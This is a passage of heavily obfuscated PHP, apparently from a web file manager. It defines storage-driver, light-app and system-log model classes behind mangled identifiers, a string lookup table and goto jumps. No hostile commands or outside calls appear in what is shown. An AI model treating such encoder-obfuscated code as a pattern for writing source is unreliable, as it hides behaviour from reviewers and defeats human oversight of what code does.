$_SERVER[”ú…±Ú¥]; self::log($”ª°°Ïš[1276] . $º‚–ÒÇç . $”ª°°Ïš[71] . count($şŸİéèÜ), $”ª°°Ïš[783]); if ($şŸİéèÜ) { return IO::setContent($º‚–ÒÇç, json_encode($şŸİéèÜ)); } $ªèÖ÷ı¿ = IO::pathFather($º‚–ÒÇç); IO::remove($º‚–ÒÇç); self::clearEmptyFolder($ªèÖ÷ı¿); return !0; } public static function clearEmptyFolder($ÆÑŸµÚ³) { $ù±ûãğ„ =& $_SERVER[”ú…±Ú¥]; if (trim($ÆÑŸµÚ³, $ù±ûãğ„[8]) == trim(self::$_historyBase, $ù±ûãğ„[8])) { return; } $œÇúéôæ = IO::pathFather($ÆÑŸµÚ³); $ÍÜµ¼•ˆ = IO::has($ÆÑŸµÚ³, !0); if ($ÍÜµ¼•ˆ[$ù±ûãğ„[217]] > 0 || $ÍÜµ¼•ˆ[$ù±ûãğ„[218]] > 0) { return; } IO::remove($ÆÑŸµÚ³); self::clearEmptyFolder($œÇúéôæ); } private static function getBasePath() { $÷²ı²ØĞ =& $_SERVER[”ú…±Ú¥]; $Í÷÷Æô¹ = Model($÷²ı²ØĞ[1277])->get($÷²ı²ØĞ[1278]); if ($Í÷÷Æô¹) { if (!IO::exist($Í÷÷Æô¹)) { IO::mkdir($Í÷÷Æô¹); } if (get_path_this($Í÷÷Æô¹) == $÷²ı²ØĞ[1263]) { $¦Æ‡…±• = $÷²ı²ØĞ[1279] . rand_string(8); @rename($Í÷÷Æô¹, get_path_father($Í÷÷Æô¹) . $÷²ı²ØĞ[8] . $¦Æ‡…±•); $Í÷÷Æô¹ = DATA_PATH . $¦Æ‡…±• . $÷²ı²ØĞ[8]; file_put_contents(DATA_PATH . $÷²ı²ØĞ[1213], $÷²ı²ØĞ[12]); Model($÷²ı²ØĞ[1277])->set($÷²ı²ØĞ[1278], $Í÷÷Æô¹); } return $Í÷÷Æô¹; } $Í÷÷Æô¹ = DATA_PATH . $÷²ı²ØĞ[1279] . rand_string(8) . $÷²ı²ØĞ[8]; $Í÷÷Æô¹ = IO::mkdir($Í÷÷Æô¹); $Í÷÷Æô¹ = rtrim($Í÷÷Æô¹, $÷²ı²ØĞ[8]) . $÷²ı²ØĞ[8]; file_put_contents($Í÷÷Æô¹ . $÷²ı²ØĞ[1213], $÷²ı²ØĞ[12]); file_put_contents(DATA_PATH . $÷²ı²ØĞ[1213], $÷²ı²ØĞ[12]); Model($÷²ı²ØĞ[1277])->set($÷²ı²ØĞ[1278], $Í÷÷Æô¹); return $Í÷÷Æô¹; } } goto F¶×„²ô”à; C†»À¹´‹Ü: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x73\164\x6f\162\x61\x67\x65\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\163\x69\x7a\x65\x4d\x61\x78", "\x73\x79\163\164\x65\x6d", "\144\145\x66\x61\x75\154\x74", "\144\x72\x69\166\x65\x72", "\x63\157\x6e\x66\151\x67"); public function listData($ÊúÎ¢ü = false, $±ÛÈÃíâ = "\x6d\x6f\x64\151\x66\171\124\x69\x6d\145", $¤¶À³„ = false) { $‰ã›•’Í =& $_SERVER[”ú…±Ú¥]; $ğÅøÈ–˜ = parent::listData($ÊúÎ¢ü, $±ÛÈÃíâ, $¤¶À³„); if ($ÊúÎ¢ü) { return $ğÅøÈ–˜; } $äêó™ÑÔ = $this->ioSizeUseGet(array_to_keyvalue($ğÅøÈ–˜, $‰ã›•’Í[12], $‰ã›•’Í[437])); foreach ($ğÅøÈ–˜ as $’—¦œ¤… => $ôÕ’Ÿ÷ü) { unset($ğÅøÈ–˜[$’—¦œ¤…][$‰ã›•’Í[6]]); $ğÅøÈ–˜[$’—¦œ¤…][$‰ã›•’Í[1850]] = isset($äêó™ÑÔ[$ôÕ’Ÿ÷ü[$‰ã›•’Í[437]]]) ? $äêó™ÑÔ[$ôÕ’Ÿ÷ü[$‰ã›•’Í[437]]] : 0; } return $ğÅøÈ–˜; } public function ioSizeUseGet($¿Œ¼åÎõ) { $³É³•¤Ë =& $_SERVER[”ú…±Ú¥]; if (!$¿Œ¼åÎõ) { return array(); } $šÃ¶‰™ = $³É³•¤Ë[2178] . implode($³É³•¤Ë[50], $¿Œ¼åÎõ); $ËÀé£€¨ = Cache::get($šÃ¶‰™); if ($ËÀé£€¨) { return $ËÀé£€¨; } $‚ß¢Æ‹ = array($³É³•¤Ë[849] => $³É³•¤Ë[437], $³É³•¤Ë[2179] => $³É³•¤Ë[76]); $‹¹§ê¹Ê = array($³É³•¤Ë[849] => array($³É³•¤Ë[7], $¿Œ¼åÎõ)); $ËÀé£€¨ = Model($³É³•¤Ë[821])->field($‚ß¢Æ‹)->where($‹¹§ê¹Ê)->group($³É³•¤Ë[849])->select(); $ËÀé£€¨ = array_to_keyvalue($ËÀé£€¨, $³É³•¤Ë[437], $³É³•¤Ë[76]); Cache::set($šÃ¶‰™, $ËÀé£€¨, 600); return $ËÀé£€¨; } public function getConfig($ò×ŒğøÁ) { $·Ü€”º„ = parent::listData($ò×ŒğøÁ); return json_decode($·Ü€”º„[$_SERVER[”ú…±Ú¥][6]], !0); } public function update($——–†­ö, $´ÕÒë…ó) { $†ı‹™°ˆ =& $_SERVER[”ú…±Ú¥]; $‚í”§ñ  = $´ÕÒë…ó[$†ı‹™°ˆ[32]]; $œ¸ôØ¦ = array_to_keyvalue(parent::listData(), $†ı‹™°ˆ[32]); if (isset($œ¸ôØ¦[$‚í”§ñ ]) && $œ¸ôØ¦[$‚í”§ñ ][$†ı‹™°ˆ[437]] != $——–†­ö) { return !1; } $this->checkPwd($——–†­ö, $´ÕÒë…ó); if (isset($´ÕÒë…ó[$†ı‹™°ˆ[2180]]) && $´ÕÒë…ó[$†ı‹™°ˆ[2180]] == $†ı‹™°ˆ[88]) { $this->checkConfig($´ÕÒë…ó); } unset($´ÕÒë…ó[$†ı‹™°ˆ[2180]]); $»‚”Êô¥ = parent::update($——–†­ö, $´ÕÒë…ó); if ($»‚”Êô¥ && $´ÕÒë…ó[$†ı‹™°ˆ[37]]) { $ùğû³üÁ = 0; foreach ($œ¸ôØ¦ as $‰Ñ¤“ìŞ) { if ($‰Ñ¤“ìŞ[$†ı‹™°ˆ[37]] && $‰Ñ¤“ìŞ[$†ı‹™°ˆ[437]] != $——–†­ö) { $ùğû³üÁ = $‰Ñ¤“ìŞ[$†ı‹™°ˆ[437]]; parent::update($‰Ñ¤“ìŞ[$†ı‹™°ˆ[437]], array($†ı‹™°ˆ[37] => 0)); } } $this->updateBackup($——–†­ö, $ùğû³üÁ); } return $»‚”Êô¥; } public function add($í¢»öö) { $¨ÆØ‰üÌ =& $_SERVER[”ú…±Ú¥]; $Òëİ—€Â = array_to_keyvalue(parent::listData(), $¨ÆØ‰üÌ[32]); if (isset($Òëİ—€Â[$í¢»öö[$¨ÆØ‰üÌ[32]]])) { return !1; } $this->checkConfig($í¢»öö); $Ïêœ”¹Æ = parent::insert($í¢»öö); if ($Ïêœ”¹Æ && $í¢»öö[$¨ÆØ‰üÌ[37]]) { foreach ($Òëİ—€Â as $èèó¿Ìà) { if ($èèó¿Ìà[$¨ÆØ‰üÌ[37]]) { parent::update($èèó¿Ìà[$¨ÆØ‰üÌ[437]], array($¨ÆØ‰üÌ[37] => 0)); } } } return $Ïêœ”¹Æ; } public function updateBackup($©üéŒş, $ ÷‘ªãö) { $ûÅÎÖÖ =& $_SERVER[”ú…±Ú¥]; if (!$ ÷‘ªãö) { return; } $‚Ğ‚ßÜø = Model($ûÅÎÖÖ[781])->config(); if ($‚Ğ‚ßÜø[$ûÅÎÖÖ[1641]] != $ûÅÎÖÖ[88] || $‚Ğ‚ßÜø[$ûÅÎÖÖ[783]] != $ ÷‘ªãö) { return; } $…ãí›Ú = Model($ûÅÎÖÖ[802])->get($ûÅÎÖÖ[812]); $…ãí›Ú = json_decode($…ãí›Ú, !0); if (!$…ãí›Ú) { return; } $…ãí›Ú[$ûÅÎÖÖ[783]] = $©üéŒş; Model($ûÅÎÖÖ[802])->set(array($ûÅÎÖÖ[812] => $…ãí›Ú)); } public function checkPwd($›ãÌû›¶, &$ØŸÈüé) { $•Û•–‰é =& $_SERVER[”ú…±Ú¥]; if (empty($ØŸÈüé[$•Û•–‰é[6]])) { return; } $ÑâÉÏàÉ = json_decode($ØŸÈüé[$•Û•–‰é[6]], !0); $›¦°‚ªÙ = $•Û•–‰é[12]; $ä©©òú¢ = array($•Û•–‰é[2181], $•Û•–‰é[2182], $•Û•–‰é[918]); foreach ($ä©©òú¢ as $à“Ğ—) { if (isset($ÑâÉÏàÉ[$à“Ğ—])) { $›¦°‚ªÙ = $à“Ğ—; break; } } if (!$›¦°‚ªÙ) { return; } $Ö¾Ù­£æ = $this->getConfig($›ãÌû›¶); $›½ä„ãĞ = $Ö¾Ù­£æ[$›¦°‚ªÙ]; $ñÖûÄæµ = $ÑâÉÏàÉ[$›¦°‚ªÙ]; if ($ñÖûÄæµ == str_repeat($•Û•–‰é[199], strlen($›½ä„ãĞ))) { $ÑâÉÏàÉ[$›¦°‚ªÙ] = $›½ä„ãĞ; $ØŸÈüé[$•Û•–‰é[6]] = json_encode($ÑâÉÏàÉ); } else { if ($ñÖûÄæµ != $›½ä„ãĞ) { $ØŸÈüé[$•Û•–‰é[2180]] = $•Û•–‰é[88]; } } } public function checkConfig(&$È¦¹ô——, $½Š×¶¹¨ = false) { $‘×¦ÑÜ© =& $_SERVER[”ú…±Ú¥]; $ÕÖ€’˜Ü = strtolower($È¦¹ô——[$‘×¦ÑÜ©[95]]); $ÒÑ—í å = json_decode($È¦¹ô——[$‘×¦ÑÜ©[6]], !0); foreach ($ÒÑ—í å as $Ä–„İ™ => $À™œ‚êë) { $ÒÑ—í å[$Ä–„İ™] = trim($À™œ‚êë); } $ÒÑ—í å[$‘×¦ÑÜ©[2183]] = rand_string(6); $œ±œº Ò = $GLOBALS[$‘×¦ÑÜ©[6]][$‘×¦ÑÜ©[89]][$‘×¦ÑÜ©[858]]; $¾Œ•”¬™ = isset($œ±œº Ò[$ÕÖ€’˜Ü]) ? $œ±œº Ò[$ÕÖ€’˜Ü] : ucfirst($ÕÖ€’˜Ü); $™üæ­ï = $‘×¦ÑÜ©[74] . $¾Œ•”¬™; if (!$¾Œ•”¬™ || !class_exists($™üæ­ï)) { if ($½Š×¶¹¨) { return LNG($‘×¦ÑÜ©[2184]); } write_log(array($‘×¦ÑÜ©[2185], $È¦¹ô——, get_caller_info()), $‘×¦ÑÜ©[2186]); show_json(LNG($‘×¦ÑÜ©[2184]), !1, $È¦¹ô——); } $½Œş×ŸÆ = new $™üæ­ï($ÒÑ—í å); if (in_array($ÕÖ€’˜Ü, $½Œş×ŸÆ->objectDriver)) { if (!$½Œş×ŸÆ->isBucketCors() && !$½Œş×ŸÆ->setBucketCors()) { $‡¡ÎÓ± = LNG($‘×¦ÑÜ©[2187]); $‡¡ÎÓ± .= $‘×¦ÑÜ©[2188] . LNG($‘×¦ÑÜ©[2189]); if ($½Š×¶¹¨) { return $‡¡ÎÓ±; } show_json($‡¡ÎÓ±, !1); } } $é±ÕĞµã = rtrim($ÒÑ—í å[$‘×¦ÑÜ©[1209]], $‘×¦ÑÜ©[8]) . $‘×¦ÑÜ©[8]; $ş“ïÊ“Š = $½Œş×ŸÆ->getPath($é±ÕĞµã . $‘×¦ÑÜ©[1213]); if (!$½Œş×ŸÆ->mkfile($ş“ïÊ“Š)) { if ($½Š×¶¹¨) { return LNG($‘×¦ÑÜ©[2187]); } show_json(LNG($‘×¦ÑÜ©[2187]), !1); } $ÒÑ—í å[$‘×¦ÑÜ©[1209]] = $é±ÕĞµã; $È¦¹ô——[$‘×¦ÑÜ©[6]] = json_encode($ÒÑ—í å); $È¦¹ô——[$‘×¦ÑÜ©[95]] = $¾Œ•”¬™; return !0; } public function driverListSystem() { $ÒÜôÛŒÃ =& $_SERVER[”ú…±Ú¥]; $ÖÖÏ… = parent::listData(); $Õµæ§ğ› = array(); foreach ($ÖÖÏ… as $Ö¡Àã¤æ) { unset($Ö¡Àã¤æ[$ÒÜôÛŒÃ[211]], $Ö¡Àã¤æ[$ÒÜôÛŒÃ[85]]); $Ö¡Àã¤æ[$ÒÜôÛŒÃ[6]] = json_decode($Ö¡Àã¤æ[$ÒÜôÛŒÃ[6]], !0); $Õµæ§ğ›[] = $Ö¡Àã¤æ; } return $Õµæ§ğ›; } public function defaultDriver() { $“Í‚çŒØ =& $_SERVER[”ú…±Ú¥]; $ÕÉ–³Ãû = parent::listData(); $­¶ = array_filter_by_field($ÕÉ–³Ãû, $“Í‚çŒØ[37], 1); $­¶ = $­¶[0]; if ($­¶) { $­¶[$“Í‚çŒØ[6]] = json_decode($­¶[$“Í‚çŒØ[6]], !0); } return $­¶; } public function driverInfo($ü†ÎÒ½ã) { $öåÄÎñÔ =& $_SERVER[”ú…±Ú¥]; $ôºƒÆ = array_to_keyvalue(parent::listData(), $öåÄÎñÔ[437]); if (!isset($ôºƒÆ[$ü†ÎÒ½ã])) { return !1; } $ı×À­íØ = $ôºƒÆ[$ü†ÎÒ½ã]; $ı×À­íØ[$öåÄÎñÔ[6]] = json_decode($ı×À­íØ[$öåÄÎñÔ[6]], !0); return $ı×À­íØ; } public function remove($õ€á£ãå) { $this->removeShareItems($õ€á£ãå); return parent::remove($õ€á£ãå); } public function removeWithFile($¿Ü©Ùö›, $ÔŒú£ùõ) { $ÖŞ¨Ù½Â =& $_SERVER[”ú…±Ú¥]; $Óºùëò› = array($ÖŞ¨Ù½Â[849] => $¿Ü©Ùö›); $ÃÌæÂõÇ = Model($ÖŞ¨Ù½Â[509])->where($Óºùëò›)->count(); $ñõÃÏÑÎ = Model($ÖŞ¨Ù½Â[509])->where($Óºùëò›)->sum($ÖŞ¨Ù½Â[76]); $œ¡Êˆ˜Í = $ÔŒú£ùõ . $ÖŞ¨Ù½Â[2190] . $¿Ü©Ùö›; $şµÙ¬Û = LNG($ÔŒú£ùõ == $ÖŞ¨Ù½Â[586] ? $ÖŞ¨Ù½Â[2191] : $ÖŞ¨Ù½Â[2192]); $Ë©·Ø• = new TaskFileTransfer($œ¡Êˆ˜Í, $ÖŞ¨Ù½Â[2186], $ÃÌæÂõÇ, $şµÙ¬Û . "\50{$¿Ü©Ùö›}\x29"); $Ë©·Ø•->task[$ÖŞ¨Ù½Â[795]] = (double) $ñõÃÏÑÎ; $ñÌëÁ« = KodIO::defaultDriver(); $ÜÑåµÈå = $ñÌëÁ«[$ÖŞ¨Ù½Â[437]]; $±´¥›§ô = "\x7b\151\157\x3a{$ÜÑåµÈå}\175\x2f"; $ã…¸àá = !0; $¡–ìË– = array(); $‡âæ´® = Model($ÖŞ¨Ù½Â[210])->where($Óºùëò›)->field($ÖŞ¨Ù½Â[2193])->select(); foreach ($‡âæ´® as $Ñ¹èöˆ) { $şİÃçÂ… = $Ñ¹èöˆ[$ÖŞ¨Ù½Â[84]]; $ã”ºÓÚ = $±´¥›§ô . str_replace("\173\151\157\x3a{$¿Ü©Ùö›}\x7d\x2f", $ÖŞ¨Ù½Â[12], $şİÃçÂ…); if (!IO::exist($şİÃçÂ…)) { $¡–ìË–[] = $Ñ¹èöˆ[$ÖŞ¨Ù½Â[506]]; $Ë©·Ø•->updateFileEnd($Ñ¹èöˆ[$ÖŞ¨Ù½Â[32]], $Ñ¹èöˆ[$ÖŞ¨Ù½Â[76]]); continue; } if (IO::exist($ã”ºÓÚ)) { $Ë©·Ø•->updateFileEnd($Ñ¹èöˆ[$ÖŞ¨Ù½Â[32]], $Ñ¹èöˆ[$ÖŞ¨Ù½Â[76]]); continue; } if (!IO::move($şİÃçÂ…, get_path_father($ã”ºÓÚ))) { $ã…¸àá = !1; break; } $Óºùëò› = array($ÖŞ¨Ù½Â[506] => $Ñ¹èöˆ[$ÖŞ¨Ù½Â[506]]); $Ÿñ÷ÅÖ = array($ÖŞ¨Ù½Â[849] => $ÜÑåµÈå, $ÖŞ¨Ù½Â[84] => $ã”ºÓÚ); Model($ÖŞ¨Ù½Â[210])->where($Óºùëò›)->save($Ÿñ÷ÅÖ); } $this->removeByFileID($¡–ìË–); if (!$ã…¸àá) { $Ë©·Ø•->stop($œ¡Êˆ˜Í); return !1; } $Ë©·Ø•->end(); if ($ÔŒú£ùõ == $ÖŞ¨Ù½Â[1830]) { $this->remove($¿Ü©Ùö›); } } public function progress($ôÚí“É‹, $Åêö™ô´) { return Task::get($Åêö™ô´ . $_SERVER[”ú…±Ú¥][2190] . $ôÚí“É‹); } private function removeByFileID($ôÇ¨Òù = array()) { $«ºò„Ø‚ =& $_SERVER[”ú…±Ú¥]; if (empty($ôÇ¨Òù)) { return; } $¾ÖòÀµ– = array($«ºò„Ø‚[506] => array($«ºò„Ø‚[7], $ôÇ¨Òù)); $µ¶ˆ§ªé = Model($«ºò„Ø‚[1362])->where($¾ÖòÀµ–)->field($«ºò„Ø‚[440])->select(); if (!$µ¶ˆ§ªé) { return; } $µ¶ˆ§ªé = array_to_keyvalue($µ¶ˆ§ªé, $«ºò„Ø‚[12], $«ºò„Ø‚[440]); foreach ($µ¶ˆ§ªé as $²«ÜÄóÁ) { Model($«ºò„Ø‚[454])->removeNow($²«ÜÄóÁ, !1); } } private function removeShareItems($Æ×š¥) { $›“ó¹£ =& $_SERVER[”ú…±Ú¥]; $÷Ü¡Ôã¸ = "\x7b\151\x6f\x3a{$Æ×š¥}\175\57"; $Ïù„ñ½ = array($›“ó¹£[440] => 0, $›“ó¹£[1204] => array($›“ó¹£[421], "{$÷Ü¡Ôã¸}\45")); $şè™ï·æ = Model($›“ó¹£[1841])->where($Ïù„ñ½)->field($›“ó¹£[631])->select(); if (empty($şè™ï·æ)) { return; } $¼Í÷Å¥© = array_to_keyvalue($şè™ï·æ, $›“ó¹£[12], $›“ó¹£[631]); Model($›“ó¹£[630])->remove($¼Í÷Å¥©); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\114\x69\x67\150\164\101\160\160"; public $modelType = "\123\171\x73\x74\x65\x6d\117\x70\164\151\157\x6e"; public $field = array("\156\x61\x6d\145", "\147\x72\157\x75\160", "\x64\x65\x73\x63", "\143\x6f\x6e\164\145\x6e\x74"); public function listData($£Û¯¤­¾ = false, $ªœØ¹ = "\155\157\x64\x69\x66\x79\x54\151\x6d\x65", $šÆÛŒÑå = true) { return parent::listData($£Û¯¤­¾, $ªœØ¹, $šÆÛŒÑå); } public function remove($”–Åñœá) { $Ë×ÏëŠ¿ = $this->findByName($”–Åñœá); if (!$Ë×ÏëŠ¿) { return !1; } return parent::remove($Ë×ÏëŠ¿[$_SERVER[”ú…±Ú¥][437]]); } public function add($ÕÒñ™¼¯) { if ($this->findByName($ÕÒñ™¼¯[$_SERVER[”ú…±Ú¥][32]])) { return !1; } return parent::insert($ÕÒñ™¼¯); } public function update($§‚ˆğÁ, $Åñ´­š») { $øâŞ×‰ =& $_SERVER[”ú…±Ú¥]; $ˆ•şğ¿ = $this->findByName($§‚ˆğÁ); $˜şÙÊşè = $this->findByName($Åñ´­š»[$øâŞ×‰[32]]); if (!$ˆ•şğ¿ || $˜şÙÊşè && $˜şÙÊşè[$øâŞ×‰[437]] != $ˆ•şğ¿[$øâŞ×‰[437]]) { return !1; } return parent::update($ˆ•şğ¿[$øâŞ×‰[437]], $Åñ´­š»); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\x66\165\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $…‚‹ŒË³ =& $_SERVER[”ú…±Ú¥]; return array($…‚‹ŒË³[2194] => LNG($…‚‹ŒË³[2195]), $…‚‹ŒË³[2196] => LNG($…‚‹ŒË³[2197]), $…‚‹ŒË³[1804] => LNG($…‚‹ŒË³[2198]), $…‚‹ŒË³[2199] => LNG($…‚‹ŒË³[2200]), $…‚‹ŒË³[2201] => LNG($…‚‹ŒË³[2202]), $…‚‹ŒË³[2203] => LNG($…‚‹ŒË³[2204]), $…‚‹ŒË³[2205] => LNG($…‚‹ŒË³[2206]), $…‚‹ŒË³[1834] => LNG($…‚‹ŒË³[2206]), $…‚‹ŒË³[1835] => LNG($…‚‹ŒË³[2207]), $…‚‹ŒË³[2208] => LNG($…‚‹ŒË³[2209]), $…‚‹ŒË³[2210] => LNG($…‚‹ŒË³[2211]), $…‚‹ŒË³[2212] => LNG($…‚‹ŒË³[2213]), $…‚‹ŒË³[2214] => LNG($…‚‹ŒË³[2215]), $…‚‹ŒË³[1832] => LNG($…‚‹ŒË³[2216]), $…‚‹ŒË³[2217] => LNG($…‚‹ŒË³[2218]), $…‚‹ŒË³[1839] => LNG($…‚‹ŒË³[2219]), $…‚‹ŒË³[2220] => LNG($…‚‹ŒË³[2221]), $…‚‹ŒË³[2222] => LNG($…‚‹ŒË³[2223]), $…‚‹ŒË³[2224] => LNG($…‚‹ŒË³[2225]), $…‚‹ŒË³[2226] => LNG($…‚‹ŒË³[2227]), $…‚‹ŒË³[1842] => LNG($…‚‹ŒË³[2228]), $…‚‹ŒË³[1843] => LNG($…‚‹ŒË³[2229]), $…‚‹ŒË³[2230] => LNG($…‚‹ŒË³[2231]), $…‚‹ŒË³[2232] => LNG($…‚‹ŒË³[2233]), $…‚‹ŒË³[2234] => LNG($…‚‹ŒË³[2235]), $…‚‹ŒË³[1837] => LNG($…‚‹ŒË³[2236]), $…‚‹ŒË³[2237] => LNG($…‚‹ŒË³[2238]), $…‚‹ŒË³[1836] => LNG($…‚‹ŒË³[2239]), $…‚‹ŒË³[2240] => LNG($…‚‹ŒË³[2241]), $…‚‹ŒË³[2242] => LNG($…‚‹ŒË³[2243]), $…‚‹ŒË³[2244] => LNG($…‚‹ŒË³[2245]), $…‚‹ŒË³[2246] => LNG($…‚‹ŒË³[2246]), $…‚‹ŒË³[2247] => LNG($…‚‹ŒË³[1808]), $…‚‹ŒË³[2248] => LNG($…‚‹ŒË³[2249]), $…‚‹ŒË³[2250] => LNG($…‚‹ŒË³[2251]), $…‚‹ŒË³[2252] => LNG($…‚‹ŒË³[2253]), $…‚‹ŒË³[2254] => LNG($…‚‹ŒË³[2255]), $…‚‹ŒË³[2256] => LNG($…‚‹ŒË³[2257]), $…‚‹ŒË³[2258] => LNG($…‚‹ŒË³[2258]), $…‚‹ŒË³[2259] => LNG($…‚‹ŒË³[2260]), $…‚‹ŒË³[2261] => LNG($…‚‹ŒË³[2262]), $…‚‹ŒË³[2263] => LNG($…‚‹ŒË³[2264]), $…‚‹ŒË³[2265] => LNG($…‚‹ŒË³[2266]), $…‚‹ŒË³[2267] => LNG($…‚‹ŒË³[2268]), $…‚‹ŒË³[2269] => LNG($…‚‹ŒË³[2270])); } private function typeFile() { $‡²¼ÆÙ =& $_SERVER[”ú…±Ú¥]; $¸À¯úÑÏ = array($‡²¼ÆÙ[1839] => array($‡²¼ÆÙ[1840]), $‡²¼ÆÙ[2212] => array($‡²¼ÆÙ[2271]), $‡²¼ÆÙ[2214] => array($‡²¼ÆÙ[2272]), $‡²¼ÆÙ[1832] => array($‡²¼ÆÙ[1833]), $‡²¼ÆÙ[2222] => array(), $‡²¼ÆÙ[2224] => array(), $‡²¼ÆÙ[2226] => array(), $‡²¼ÆÙ[1842] => array($‡²¼ÆÙ[1844]), $‡²¼ÆÙ[1843] => array($‡²¼ÆÙ[1844]), $‡²¼ÆÙ[2230] => array($‡²¼ÆÙ[2273]), $‡²¼ÆÙ[2232] => array($‡²¼ÆÙ[2273]), $‡²¼ÆÙ[2234] => array($‡²¼ÆÙ[2274]), $‡²¼ÆÙ[2220] => array($‡²¼ÆÙ[2275]), $‡²¼ÆÙ[1837] => array($‡²¼ÆÙ[2276]), $‡²¼ÆÙ[2237] => array($‡²¼ÆÙ[2277]), $‡²¼ÆÙ[1836] => array($‡²¼ÆÙ[1838])); return $¸À¯úÑÏ; } private function typeAll() { $–È§¿ª =& $_SERVER[”ú…±Ú¥]; $İšÖÇµ = $this->typeList; $¥÷˜éş = array_filter($this->typeFile()); foreach ($¥÷˜éş as $ò­Æ‰á => $µéÕ¡›Õ) { $İšÖÇµ[$µéÕ¡›Õ[0]] = $İšÖÇµ[$ò­Æ‰á]; } $İšÖÇµ[$–È§¿ª[1844]] = LNG($–È§¿ª[2278]); $İšÖÇµ[$–È§¿ª[2273]] = LNG($–È§¿ª[2279]); return $İšÖÇµ; } public function addLog($İû¾Ø‘Ñ, $ÏÑöæ³‘ = array()) { $Ş«€Ç–ù =& $_SERVER[”ú…±Ú¥]; if (!isset($this->typeList[$İû¾Ø‘Ñ])) { return; } $ú…˜±Œ = isset($ÏÑöæ³‘[$Ş«€Ç–ù[1671]]) ? $ÏÑöæ³‘[$Ş«€Ç–ù[1671]] : 0; if (!$ú…˜±Œ) { $ú…˜±Œ = Session::get($Ş«€Ç–ù[1998]); } if ($İû¾Ø‘Ñ == $Ş«€Ç–ù[2248] && is_array($ÏÑöæ³‘[$Ş«€Ç–ù[2280]]) && !$ÏÑöæ³‘[$Ş«€Ç–ù[2280]]) { return; } $ºá¡ˆÃá = get_client_ip(); if (!$ÏÑöæ³‘ || strlen(json_encode($ÏÑöæ³‘)) >= 1024) { $ÏÑöæ³‘ = array($Ş«€Ç–ù[2281] => $ºá¡ˆÃá); } else { if (is_array($ÏÑöæ³‘)) { $ÏÑöæ³‘[$Ş«€Ç–ù[2281]] = $ºá¡ˆÃá; } else { $ÏÑöæ³‘ = array($Ş«€Ç–ù[1231] => $ÏÑöæ³‘, $Ş«€Ç–ù[2281] => $ºá¡ˆÃá); } } $ÏÑöæ³‘ = array($Ş«€Ç–ù[1661] => Session::sign(), $Ş«€Ç–ù[1662] => intval($ú…˜±Œ), $Ş«€Ç–ù[33] => $İû¾Ø‘Ñ, $Ş«€Ç–ù[1664] => json_encode($ÏÑöæ³‘)); parent::add($ÏÑöæ³‘); } public function remove($ş‹şÁ¼¤) { $this->where(array($_SERVER[”ú…±Ú¥][457] => $ş‹şÁ¼¤))->delete(); } private function _makeOrder($œ¹üİÛ– = '') { $†É³ö”Ø =& $_SERVER[”ú…±Ú¥]; $õ×Á¬¸Ù = $†É³ö”Ø[211]; $­ÔÏôÃ  = array($†É³ö”Ø[488] => $†É³ö”Ø[489], $†É³ö”Ø[490] => $†É³ö”Ø[491]); $‘ñ‹ä­Ş = Input::get($†É³ö”Ø[496], $†É³ö”Ø[7], $†É³ö”Ø[2034], array($†É³ö”Ø[1952], $†É³ö”Ø[490])); $‘ñ‹ä­Ş = $­ÔÏôÃ [$‘ñ‹ä­Ş]; $œ¹üİÛ– = $œ¹üİÛ– . "{$õ×Á¬¸Ù}\40{$‘ñ‹ä­Ş}"; return $this->order($œ¹üİÛ–); } public function get($Íš€Î„Û = '') { $š–Îöæ³ =& $_SERVER[”ú…±Ú¥]; if (!$Íš€Î„Û) { show_json(array()); } $ß×÷ÈÈÃ = array(); if ($Íš€Î„Û[$š–Îöæ³[1671]]) { $ß×÷ÈÈÃ[$š–Îöæ³[1671]] = $Íš€Î„Û[$š–Îöæ³[1671]]; } if (isset($Íš€Î„Û[$š–Îöæ³[792]])) { $³÷™äŞÙ = $Íš€Î„Û[$š–Îöæ³[792]]; $°ÍÑø´¦ = isset($Íš€Î„Û[$š–Îöæ³[793]]) ? $Íš€Î„Û[$š–Îöæ³[793]] : time(); $ß×÷ÈÈÃ[$š–Îöæ³[211]] = array($š–Îöæ³[371], array($³÷™äŞÙ, $°ÍÑø´¦)); } if ($Íš€Î„Û[$š–Îöæ³[33]]) { $é¦¨îóı = explode($š–Îöæ³[50], $Íš€Î„Û[$š–Îöæ³[33]]); $Æ€‹½¼ = $this->typeFile(); $†ş˜Ô­ = array(); foreach ($é¦¨îóı as $£ ‰©¦½) { $†ş˜Ô­[] = $£ ‰©¦½; if (isset($Æ€‹½¼[$£ ‰©¦½])) { $†ş˜Ô­ = array_merge($†ş˜Ô­, $Æ€‹½¼[$£ ‰©¦½]); } } $†ş˜Ô­ = array_unique($†ş˜Ô­); if ($†ş˜Ô­) { $ß×÷ÈÈÃ[$š–Îöæ³[33]] = array($š–Îöæ³[7], $†ş˜Ô­); } } else { $ß×÷ÈÈÃ[$š–Îöæ³[33]] = array($š–Îöæ³[2282], $š–Îöæ³[2283]); } if (!empty($Íš€Î„Û[$š–Îöæ³[2281]])) { $ß×÷ÈÈÃ[$š–Îöæ³[491]] = array($š–Îöæ³[421], "\45{$Íš€Î„Û[$š–Îöæ³[2281]]}\45"); } $±¥ Øµ„ = $this->_makeOrder()->where($ß×÷ÈÈÃ)->selectPage(); if (empty($±¥ Øµ„[$š–Îöæ³[407]])) { show_json(array(), !0, $±¥ Øµ„[$š–Îöæ³[404]]); } $±¥ Øµ„[$š–Îöæ³[407]] = $this->logList($±¥ Øµ„[$š–Îöæ³[407]]); return $±¥ Øµ„; } private function ipAddress(&$ê³Šì“¦) { $Û‰¥°› =& $_SERVER[”ú…±Ú¥]; if (!empty($ê³Šì“¦[$Û‰¥°›[2281]])) { $Ñşİâá¿ = IpLocation::get($ê³Šì“¦[$Û‰¥°›[2281]]); } else { $Ñşİâá¿ = LNG($Û‰¥°›[2284]); } $ê³Šì“¦[$Û‰¥°›[2285]] = $Ñşİâá¿; } private function descZipDownload($¤‘ºÍØí, &$”ğÈÃÇâ) { $é¯áÃîÌ =& $_SERVER[”ú…±Ú¥]; if (!isset($¤‘ºÍØí[$é¯áÃîÌ[2286]])) { 